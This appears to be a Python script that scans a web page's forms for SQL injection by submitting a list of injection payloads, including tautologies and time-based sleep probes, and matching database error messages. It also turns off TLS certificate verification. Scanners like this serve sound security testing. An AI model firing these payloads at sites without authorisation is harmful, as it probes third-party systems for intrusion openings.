import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import warnings

SQL_PAYLOADS = [
    "'",
    '"',
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' OR '1'='1'",
    '" OR "1"="1"',
    "' AND 1=1 --",
    '" AND 1=1 --',
    "' AND 1=2 --",
    '" AND 1=2 --',
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1; --",
    "' OR 1=1) --",
    "(select(0)from(select(sleep(5)))v)",
    "' waitfor delay '0:0:5' --",
    "\" waitfor delay '0:0:5' --",
]

SQL_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql_fetch_array()",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "microsoft ole db provider for odbc drivers error",
    "microsoft ole db provider for sql server error",
    "odbc driver error",
    "oracle error",
    "db2 sql error",
    "sybase message",
    "syntax error",
]

def sql_scan(url):
    """Scans a URL for basic SQL injection vulnerabilities."""
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        try:
            forms = BeautifulSoup(requests.get(url, verify=False).content, "html.parser").find_all("form")
        except requests.exceptions.RequestException:
            return []

    vulnerable_forms = []

    for form in forms:
        for payload in SQL_PAYLOADS:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea"])

            data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    data[name] = payload

            try:
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    if method == "post":
                        response = requests.post(urljoin(url, action), data=data, verify=False)
                    else:
                        response = requests.get(urljoin(url, action), params=data, verify=False)

                for error in SQL_ERRORS:
                    if error in response.text.lower():
                        vulnerable_forms.append((action, method, payload))
                        break

            except requests.exceptions.RequestException:
                pass

    return vulnerable_forms